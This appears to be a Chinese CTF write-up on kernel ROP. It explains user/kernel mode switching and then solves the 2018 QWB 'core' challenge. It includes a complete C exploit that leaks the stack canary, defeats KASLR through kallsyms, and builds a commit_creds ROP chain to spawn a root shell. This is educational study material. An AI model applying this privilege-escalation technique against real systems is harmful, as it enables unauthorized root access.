---
title: KROP
date: '2025-12-17 12:28:02'
updated: '2025-12-28 10:39:45'
---
# 汇编层面的用户-内核态切换
从用户态到内核态需要通过系统调用进入，而从内核态安全着陆回用户态需要有对应的返回指令：

`swapgs`：交换 GS 寄存器的内容 与 `IA32_KERNEL_GS_BASE` 特殊模块寄存器（MSR）的内容

> swapgs 成对执行，因为离开内核态跟进入时只需要交换就行
>

`popfq`：从栈顶弹出一个值到 `RFLAGS` 寄存器中

`sysretq`：与`syscall`配套，具体操作：

+ 从寄存器 `RCX` 中提取值并放入 `RIP`（恢复程序执行位置）
+ 从寄存器 `R11` 中提取值并放入 `RFLAGS`（恢复标志位）
+ 根据 `IA32_STAR` MSR 寄存器的配置，将段寄存器 `CS` 和 `SS` 切换回用户态的段选择子

`iretq`：从内核栈中 pop 出 5 个对应值到寄存器里：

1. `RIP` (Instruction Pointer)
2. `CS` (Code Segment)
3. `RFLAGS`
4. `RSP` (Stack Pointer)
5. `SS` (Stack Segment)

所以返回用户态的 rop 链：

```c
swapgs
iretq
user_shell_addr
user_cs
user_eflags //64bit user_rflags
user_sp
user_ss
```

# 常用代码
宿主机在要写入文件的路径下用 python 开一个简易 http 服务：

```bash
python3 -m http.server 8000
```

qemu 虚拟机中使用 wget（busybox 也有）：

```bash
# 10.0.2.2 是 QEMU 默认分配给宿主机的 IP
wget http://10.0.2.2:8000/exp.c
```



```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

//打印信息函数宏
#define SUCCESS_MSG(msg)    "\033[32m\033[1m[+] " msg "\033[0m"
#define INFO_MSG(msg)       "\033[34m\033[1m[*] " msg "\033[0m"
#define ERROR_MSG(msg)      "\033[31m\033[1m[x] " msg "\033[0m"
#define log_success(msg)    puts(SUCCESS_MSG(msg))
#define log_info(msg)       puts(INFO_MSG(msg))
#define log_error(msg)      puts(ERROR_MSG(msg))

//保存用户空间状态函数
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(void){
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    log_success("Status has been saved.");
}

void check_root(void){
    if(getuid()) {
        log_error("Failed to get the root!");
        sleep(5);
        exit(-1);
    }
}

void get_root_shell(void){
    check_root();
    log_success("Successful to get the root.");
    log_info("Execve root shell now...");
    system("/bin/sh");
    exit(0);
}

void main(void){
    ...
    }
```

编译配置

```bash
musl-gcc -no-pie -static -o exp ./exp.c -masm=intel
```

# 强网杯 2018 core
```bash
file core.cpio
> core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix, original size 53442048
```

没想到这里的 cpio 居然是要先解压再解包的

```bash
mkdir core
cd core 
mv ../core.cpio core.cpio.gz
gunzip ./core.cpio.gz 
cpio -idm < ./core.cpio
```

关键看 ko 内核模块：

![](/images/8d6c93c8a9f7a62f7f814a8467f0d72b.png)

其中 ioctl 是处理用户空间传来的指令的函数：

![](/images/9b9aa6cc40ebe381be51ea048fe07e49.png)

这里面分了三个选项：

1. 调用 core_read
2. 设置全局变量 off
3. 调用 core_copy_func

接着看调用的两个函数

![](/images/bf622bfd2d460959f0157f3c1cc28403.png)

read 这里有个数组越界，可以读到内核栈上面的内容

![](/images/ea55174a98fc9ae27b3cda8508be9115.png)

这里的 copy 的长度是按照 unsignedint 来的，存在溢出

然后还有 core_write 函数，这个函数可以通过用户态的 write 函数直接调用到：

这个函数可以直接向全局变量 name 写入内容

![](/images/8b7f6950550ad2df39f65410bd9475c8.png)

对应的交互函数：

```c
void core_read(int fd, char *buf)
{
    ioctl(fd, 0x6677889B, buf);
}

void set_off_val(int fd, size_t off)
{
    ioctl(fd, 0x6677889C, off);
}

void core_copy(int fd, size_t nbytes)
{
    ioctl(fd, 0x6677889A, nbytes);
}
```

## gadget 获取
```c
ropper --file ./vmlinux
```

## 保存用户态
```c
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(void){
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    log_success("Status has been saved.");
}
```

因为这里用的内联函数是 intel 语法的，所以在编译 exp 的时候要加上`-masm=intel`参数

## 用户态与内核态的交互
```c
void core_read(int fd, char *buf)
{
    ioctl(fd, 0x6677889B, buf);
}
void set_off_val(int fd, size_t off)
{
    ioctl(fd, 0x6677889C, off);
}
void core_copy(int fd, size_t nbytes)
{
    ioctl(fd, 0x6677889A, nbytes);
}
write(fd, rop_chain, 0x800);
```

## ROP 链
```c
//prepare_kernel_cred(null);获取类似init的root权限的cred结构体指针
rop_chain[i++]=POP_RDI_RET + kernel_offset;
printf(SUCCESS_MSG("ROP chain addr: ") "%lx\n", &rop_chain[10]);
rop_chain[i++]=0x0;
rop_chain[i++]=prepare_kernel_cred;
rop_chain[i++]=POP_RDX_RET + kernel_offset;
rop_chain[i++]=POP_RCX_RET + kernel_offset;
rop_chain[i++]=MOV_RDI_RAX_CALL_RDX + kernel_offset;
//别忘了call指令会把下一个指令的地址压入栈，用pop_rcx正好跳过接着返回到下面的commit_creds
rop_chain[i++]=commit_creds;
//返回用户态
rop_chain[i++]=SWAPGS_POPFQ_RET + kernel_offset;
rop_chain[i++]=0x0; //占位
rop_chain[i++]=IRETQ + kernel_offset;
rop_chain[i++]=(size_t)get_root_shell;
rop_chain[i++]=user_cs;
rop_chain[i++]=user_rflags;
rop_chain[i++]=user_sp+8;
rop_chain[i++]=user_ss;
```

## exp
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>

//打印信息函数宏
#define SUCCESS_MSG(msg)    "\033[32m\033[1m[+] " msg "\033[0m"
#define INFO_MSG(msg)       "\033[34m\033[1m[*] " msg "\033[0m"
#define ERROR_MSG(msg)      "\033[31m\033[1m[x] " msg "\033[0m"
#define log_success(msg)    puts(SUCCESS_MSG(msg))
#define log_info(msg)       puts(INFO_MSG(msg))
#define log_error(msg)      puts(ERROR_MSG(msg))

//一些基础信息
size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t kernel_base = 0xffffffff81000000, kernel_offset;

//保存用户空间状态函数
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(void){
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    log_success("Status has been saved.");
}

void check_root(void){
    if(getuid()) {
        log_error("Failed to get the root!");
        sleep(5);
        exit(-1);
    }
}

void get_root_shell(void){
    check_root();
    log_success("Successful to get the root.");
    log_info("Execve root shell now...");
    system("/bin/sh");
    exit(0);
}

//三个交互函数
void core_read(int fd, char *buf)
{
    ioctl(fd, 0x6677889B, buf);
}
void set_off_val(int fd, size_t off)
{
    ioctl(fd, 0x6677889C, off);
}
void core_copy(int fd, size_t nbytes)
{
    ioctl(fd, 0x6677889A, nbytes);
}

#define COMMIT_CREDS 0xffffffff8109c8e0
#define POP_RDI_RET 0xffffffff81000b2f
#define POP_RCX_RET 0xffffffff81021e53
#define POP_RDX_RET 0xffffffff810a0f49
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define IRETQ 0xffffffff81050ac2


void main(void){
    FILE *ksyms_file;
    int fd;
    char buf[0x1000],type[0x10];
    size_t addr;
    size_t canary;
    size_t rop_chain[0x100], i;

    save_status();
    //打开/proc/core设备
    fd=open("/proc/core",O_RDWR);
    if(fd < 0) {
        log_error("Failed to open the /proc/core !");
        exit(EXIT_FAILURE);
    }

    ksyms_file = fopen("/tmp/kallsyms", "r");
    if(ksyms_file == NULL) {
        log_error("Failed to open the sym_table file!");
        exit(EXIT_FAILURE);
    }

    //获取内核符号
    while(fscanf(ksyms_file, "%lx%s%s", &addr, type, buf)) {
        if(prepare_kernel_cred && commit_creds) {
            break;
        }

        if(!commit_creds && !strcmp(buf, "commit_creds")) {
            commit_creds = addr;
            printf(
                SUCCESS_MSG("Successful to get the addr of commit_cread: ")   
               "%lx\n", commit_creds);
            continue;
        }

        if(!strcmp(buf, "prepare_kernel_cred")) {
            prepare_kernel_cred = addr;
            printf(SUCCESS_MSG(
                "Successful to get the addr of prepare_kernel_cred: ")
               "%lx\n", prepare_kernel_cred);
            continue;
        }
    }

    kernel_offset = commit_creds - COMMIT_CREDS;
    kernel_base+=kernel_offset;
    printf(SUCCESS_MSG("Kernel base addr: ") "%lx\n", kernel_base);

    //泄露canary
    set_off_val(fd, 0x40);
    core_read(fd, buf);
    canary = ((size_t*) buf)[0];
    printf(SUCCESS_MSG("Leaked canary: ") "%lx\n", canary);

    for(i=0;i<10;i++){
        rop_chain[i]=canary;
    }
    //prepare_kernel_cred(null);获取类似init的root权限的cred结构体指针
    rop_chain[i++]=POP_RDI_RET + kernel_offset;
    printf(SUCCESS_MSG("ROP chain addr: ") "%lx\n", &rop_chain[10]);
    rop_chain[i++]=0x0;
    rop_chain[i++]=prepare_kernel_cred;
    rop_chain[i++]=POP_RDX_RET + kernel_offset;
    rop_chain[i++]=POP_RCX_RET + kernel_offset;
    rop_chain[i++]=MOV_RDI_RAX_CALL_RDX + kernel_offset;
    //别忘了call指令会把下一个指令的地址压入栈，用pop_rcx正好跳过接着返回到下面的commit_creds
    rop_chain[i++]=commit_creds;
    //返回用户态
    rop_chain[i++]=SWAPGS_POPFQ_RET + kernel_offset;
    rop_chain[i++]=0x0;
    rop_chain[i++]=IRETQ + kernel_offset;
    rop_chain[i++]=(size_t)get_root_shell;
    rop_chain[i++]=user_cs;
    rop_chain[i++]=user_rflags;
    rop_chain[i++]=user_sp+8;
    rop_chain[i++]=user_ss;
    // getchar();

    //写入ROP链
    write(fd, rop_chain, 0x800);
    core_copy(fd,0xffffffffffff0000|(0x100));
}
```

传到 qemu 里面执行就拿到 root 权限啦

![](/images/9925c5363ec1495e3d5a18ced6e7b856.png)

